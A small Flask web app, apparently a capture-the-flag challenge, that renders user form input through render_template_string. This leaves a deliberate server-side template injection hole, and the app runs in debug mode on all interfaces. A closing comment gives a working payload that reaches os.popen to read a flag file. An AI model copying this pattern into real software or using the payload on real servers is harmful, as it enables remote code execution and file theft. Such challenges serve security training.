from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        user_input = request.form.get("gift")
        template = f"Here is your gift, {user_input}"
        return render_template_string(template)
    
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port='5002')
    
#{{"".join(cycler.__init__.__globals__.os.popen('cat ../../../../../../flag.txt')) }}